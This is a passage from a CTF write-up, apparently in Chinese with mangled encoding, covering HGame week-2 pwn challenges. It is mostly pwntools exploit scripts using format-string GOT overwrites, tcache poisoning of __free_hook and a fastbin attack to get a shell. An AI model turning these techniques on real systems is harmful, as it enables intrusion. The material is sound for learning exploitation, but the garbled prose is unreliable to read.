else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)].ljust(8, b\u0026#34;\\x00\u0026#34;)) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... p = None def pwn(): global p if rmt: p = remote(\u0026#34;week-2.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x4016A4 c \u0026#34;\u0026#34;\u0026#34;, env=env) else: p = process(fn, env=env) # 11111111 # %8$s payload = flat([ b\u0026#34;a\u0026#34;*(0xe0), b\u0026#34;b\u0026#34;*8, ]) send_after_clean(payload) base_addr = recv_and_transform(b\u0026#34;b\u0026#34;*8) - libc.sym[\u0026#39;setbuffer\u0026#39;] - 204 system_addr = base_addr + libc.sym[\u0026#39;system\u0026#39;] one = [0xe3afe, 0xe3b01, 0xe3b04] one_gadget = base_addr + one[1] suclog( base_addr=base_addr, one_gadget=one_gadget, system_addr=system_addr ) sendline_after_clean(\u0026#34;Y\u0026#34;, \u0026#34;anything else?(Y/n)\\n\u0026#34;) payload = flat([ b\u0026#34;a\u0026#34;*(0xf8), b\u0026#34;b\u0026#34;*8, ]) send_after_clean(payload) stack_addr = recv_and_transform(b\u0026#34;b\u0026#34;*6) - 0x18 suclog(stack_addr=stack_addr) sendline_after_clean(\u0026#34;Y\u0026#34;, \u0026#34;anything else?(Y/n)\\n\u0026#34;) payload = flat([ m_elf.got[\u0026#39;__stack_chk_fail\u0026#39;], m_elf.got[\u0026#39;__stack_chk_fail\u0026#39;] + 2, m_elf.got[\u0026#39;__stack_chk_fail\u0026#39;] + 4, stack_addr ]) sendline_after_clean(payload) sendline_after_clean(\u0026#34;n\u0026#34;, \u0026#34;anything else?(Y/n)\\n\u0026#34;) write1 = one_gadget \u0026amp; 0xffff write2 = ((one_gadget \u0026gt;\u0026gt; (2*8)) \u0026amp; 0xffff) write3 = ((one_gadget \u0026gt;\u0026gt; (4*8)) \u0026amp; 0xffff) which_write = {write1:8, write2:9, write3:10} all_write = [write1, write2, write3] all_write.sort() payload = \u0026#34;\u0026#34; tmp = 0 for to_write in all_write: payload += f\u0026#34;%{to_write-tmp}c%{which_write[to_write]}$hn\u0026#34; tmp = to_write payload += f\u0026#34;%11$hhn\u0026#34; # %43$n # payload = f\u0026#34;%{write2}c%8$hn%{write1-write2}c%9$hn%{write3-write1}c%10$hn\u0026#34; sendline_after_clean(payload, \u0026#34;a gift for you: \\n\u0026#34;) pwn() interactive_after_clean() æ³•äºŒï¼šè·å–æ ˆåœ°å€åæ›´æ”¹è¿”å›åœ°å€å’Œprintfçš„gotå€¼ æˆ‘ä»¬æ—¢ç„¶å¯ä»¥æ›´æ”¹ä»»æ„åœ°å€çš„å€¼ï¼ŒåŒæ—¶è·å¾—äº†æ ˆåœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å…ˆæ›´æ”¹printfçš„gotå€¼ä¸ºsystemï¼Œå†æ›´æ”¹è¿”å›å€¼ï¼Œç„¶åè¿”å›åˆ°ä¸»å‡½æ•°æŸä¸€ä¸ªä½ç½®ï¼Œprintfå‡º/bin/shï¼Œå°±å¯ä»¥getshelläº†\nexp # è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes rmt: bool = False fn: str = \u0026#34;./HGame-week2-YukkuriSay\u0026#34; libc_name: str = \u0026#34;./libc-2.31.so\u0026#34; port: str = \u0026#34;31110\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): # argsæ˜¯å˜é‡åï¼Œæ˜¯å­—ç¬¦ä¸² for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)].ljust(8, b\u0026#34;\\x00\u0026#34;)) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... p = None def pwn(): global p if rmt: p = remote(\u0026#34;week-2.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x4016A4 c \u0026#34;\u0026#34;\u0026#34;, env=env) else: p = process(fn, env=env) # 11111111 # %8$s payload = flat([ b\u0026#34;a\u0026#34;*(0xe0), b\u0026#34;b\u0026#34;*8, ]) send_after_clean(payload) base_addr = recv_and_transform(b\u0026#34;b\u0026#34;*8) - libc.sym[\u0026#39;setbuffer\u0026#39;] - 204 system_addr = base_addr + libc.sym[\u0026#39;system\u0026#39;] one = [0xe3afe, 0xe3b01, 0xe3b04] one_gadget = base_addr + one[1] suclog( base_addr=base_addr, one_gadget=one_gadget, system_addr=system_addr ) sendline_after_clean(\u0026#34;Y\u0026#34;, \u0026#34;anything else?(Y/n)\\n\u0026#34;) payload = flat([ b\u0026#34;a\u0026#34;*(0xf8), b\u0026#34;b\u0026#34;*8, ]) send_after_clean(payload) stack_addr = recv_and_transform(b\u0026#34;b\u0026#34;*6) - 0x8 suclog(stack_addr=stack_addr) sendline_after_clean(\u0026#34;Y\u0026#34;, \u0026#34;anything else?(Y/n)\\n\u0026#34;) payload = flat([ m_elf.got[\u0026#39;printf\u0026#39;], m_elf.got[\u0026#39;printf\u0026#39;] + 2, m_elf.got[\u0026#39;printf\u0026#39;] + 4, stack_addr, stack_addr + 2 ]) sendline_after_clean(payload) sendline_after_clean(\u0026#34;n\u0026#34;, \u0026#34;anything else?(Y/n)\\n\u0026#34;) return_addr = 0x401671 write1 = system_addr \u0026amp; 0xffff write2 = ((system_addr \u0026gt;\u0026gt; (2*8)) \u0026amp; 0xffff) write3 = ((system_addr \u0026gt;\u0026gt; (4*8)) \u0026amp; 0xffff) ret1 = return_addr \u0026amp; 0xffff ret2 = (return_addr \u0026gt;\u0026gt; (2*8)) \u0026amp; 0xffff which_write = {write1:8, write2:9, write3:10, ret1: 11, ret2:12} all_write = [write1, write2, write3, ret1, ret2] all_write.sort() payload = \u0026#34;\u0026#34; tmp = 0 for to_write in all_write: payload += f\u0026#34;%{to_write-tmp}c%{which_write[to_write]}$hn\u0026#34; tmp = to_write # %43$n # payload = f\u0026#34;%{write2}c%8$hn%{write1-write2}c%9$hn%{write3-write1}c%10$hn\u0026#34; sendline_after_clean(payload, \u0026#34;a gift for you: \\n\u0026#34;) sendline_after_clean(b\u0026#34;/bin/sh\\x00\u0026#34;) pwn() interactive_after_clean() editable_note checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ä¼ªCä»£ç  è¿™é“é¢˜ä¸èµ°å¯»å¸¸è·¯ï¼Œä½¿ç”¨å†…è”æ±‡ç¼–å®ç°äº†ä¸€ä¸ªå †èœå•é¢˜ï¼Œæœ€ç»ˆè¿˜æ˜¯é€šè¿‡æ•°å­—é€‰æ‹©è¿™ä¸‰ä¸ªåŠŸèƒ½ï¼š\nå¤§è‡´æ€è·¯å°±æ˜¯å…ˆå¡«æ»¡tcache binï¼ˆ7ä¸ªï¼‰ååˆ†é…åˆ°unsorted binä¸­æ³„éœ²main_arenaï¼Œç„¶åå°†tcacheåˆ†é…åˆ°__free_hookä¸Šè¦†ç›–æ›´æ”¹ä¸ºsystem\nå°è´´å£« åœ¨æ›´æ”¹tcacheä¸­chunkçš„nextä½æ—¶ï¼Œä¸€å®šè¦ç¡®ä¿åˆ†é…å®Œ__free_hookä¸Šçš„chunkåï¼Œtcache-\u0026gt;countsè¦å¤§äº1\næ¯”å¦‚ï¼š\nåƒè¿™ç§æƒ…å†µï¼Œ0x20çš„tcache binå°±ä¸ä¼šå†ç”³è¯·__free_hookçš„chunkäº†ï¼Œè€Œæ˜¯è½¬è€Œå»åˆ†å‰²unsorted binä¸­çš„chunk\nåŸå› æ˜¯æ¯ä¸€ä¸ªä¸åŒå¤§å°çš„tcacheï¼Œå®ƒéƒ½ç‹¬ç«‹ç»´æŠ¤ä¸€ä¸ªcountsåŸŸï¼Œè€Œåœ¨mallocçš„æ—¶å€™ä¼šæ£€æŸ¥è¿™ä¸ªåŸŸï¼Œåªæœ‰å½“å®ƒå¤§äºç­‰äº0çš„æ—¶å€™æ‰ä¼šæ‰§è¡Œtcache_getï¼š\nexp # è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes rmt: bool = False fn: str = \u0026#34;./HGame-week2-editable_note\u0026#34; libc_name: str = \u0026#34;./libc-2.31.so\u0026#34; port: str = \u0026#34;30248\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if rmt: p = remote(\u0026#34;week-2.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;, env=env) else: p = process(fn, env=env) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): # argsæ˜¯å˜é‡åï¼Œæ˜¯å­—ç¬¦ä¸² for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... def allocate(index:int, size: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;1\u0026#34;, \u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), \u0026#34;Index: \u0026#34;) sendline_after_clean(str(size)) def remove(index: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;2\u0026#34;, \u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), \u0026#34;Index: \u0026#34;) def show(index: int): sendline_after_clean(b\u0026#34;4\u0026#34;, \u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), \u0026#34;Index: \u0026#34;) def change(index: int, content: bytes) -\u0026gt; None: sendline_after_clean(b\u0026#34;3\u0026#34;, \u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), \u0026#34;Index: \u0026#34;) sendline_after_clean(content, \u0026#34;Content: \u0026#34;) main_arena_offset = 0x1ECB80 allocate(0, 0x10) allocate(1, 0x80) allocate(2, 0x80) allocate(3, 0x80) allocate(4, 0x80) allocate(5, 0x80) allocate(6, 0x80) allocate(7, 0x80) allocate(8, 0x80) allocate(9, 0x10) remove(2) remove(3) remove(4) remove(5) remove(6) remove(7) remove(8) # gdb.attach(p) remove(1) show(1) # gdb.attach(p) base_addr = recv_and_transform() - main_arena_offset - 96 one = [0xe3afe, 0xe3b01, 0xe3b04] one_gadget = base_addr + one[2] hook_addr = base_addr + libc.sym[\u0026#39;__free_hook\u0026#39;] system_addr = base_addr + libc.sym[\u0026#39;system\u0026#39;] suclog( \u0026#34;base_addr\u0026#34;, \u0026#34;one_gadget\u0026#34;, \u0026#34;hook_addr\u0026#34;, \u0026#34;system_addr\u0026#34; ) # remove(8) payload = pg(hook_addr)*2 change(8, payload) # gdb.attach(p) allocate(10, 0x80) allocate(11, 0x80) # gdb.attach(p) payload = flat([ system_addr ]) change(11, payload) change(10, b\u0026#34;/bin/sh\\x00\u0026#34;) remove(10) interactive_after_clean() fast_note checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ä¼ªCä»£ç  è¿™é“é¢˜æ²¡æœ‰editå‡½æ•°ï¼ŒåŒæ—¶freeåæŒ‡é’ˆæ²¡æœ‰ç½®é›¶ï¼Œè€Œä¸”è¿˜æ˜¯ä¸€é“glibc2.23çš„é¢˜ç›®\né‚£ä¹ˆæ€è·¯å°±å¾ˆæ¸…æ¥šäº†ï¼šunsorted binæ³„éœ²main_arenaåè¿›è¡Œfastbin attack\nå°è´´å£« è¿™ä¸€é¢˜å‘__malloc_hookå†™å…¥one_gadgetå¹¶ä¸èƒ½get shellï¼Œå› ä¸ºå‡ ä¸ªé™åˆ¶æ¡ä»¶éƒ½æ²¡æœ‰æ»¡è¶³ï¼Œæˆ‘ä»¬å¯ä»¥å‘__malloc_hookå†™å…¥__libc_realloc+offsetï¼Œç„¶ååœ¨__realloc_hookä¸Šå†™å…¥one_gadget\nå› ä¸ºreallocå‡½æ•°ä¸­æœ‰å¾ˆå¤špushæŒ‡ä»¤ï¼Œä¼šæ”¹å˜å½“å‰æ ˆçš„åˆ†å¸ƒï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶offsetæ¥æ§åˆ¶æ ˆçš„æ›´æ”¹ç¨‹åº¦ã€‚\næ ¹æ®reallocçš„ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“offsetçš„å¯èƒ½å€¼ä¸º0ï¼Œ2ï¼Œ4ï¼Œ6ï¼Œ12ï¼Œ13ï¼Œè€Œé€šå¸¸çš„one_gadgetæœ‰3~4ä¸ªï¼ˆä½†æœ‰ä¸€äº›çš„é™åˆ¶æ¡ä»¶ä¸æ˜¯æ ˆï¼‰ï¼Œæ‰€ä»¥å¯èƒ½çš„æ­é…å¤§çº¦æœ‰18~24ç§ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œä¸€ä¸ªä¸€ä¸ªè¯•ä¼šå¿«ä¸€ç‚¹ï¼Œé™¤éè°ƒè¯•å¾ˆç®€å•\næ›´å¤šè¯¦è§ï¼š\nåˆ©ç”¨reallocè°ƒæ•´æ ˆä½¿one_gadgetç”Ÿæ•ˆ_LoÏ„Ï…sçš„åšå®¢-CSDNåšå®¢_one_gadget onegadgetä¸èµ·ä½œç”¨_Maxmallocçš„åšå®¢-CSDNåšå®¢_\u0026ldquo;doesn\u0026rsquo;t contain string \u0026quot;/bin/sh\u0026quot;, not glibc?\u0026rdquo; exp # è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes rmt: bool = True fn: str = \u0026#34;./HGame-week2-fast_note\u0026#34; libc_name: str = \u0026#34;./libc-2.23.so\u0026#34; port: str = \u0026#34;31938\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if rmt: p = remote(\u0026#34;week-2.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; set resolve-heap-via-heuristic on break main c \u0026#34;\u0026#34;\u0026#34;, env=env) else: p = process(fn, env=env) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): # argsæ˜¯å˜é‡åï¼Œæ˜¯å­—ç¬¦ä¸² for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, 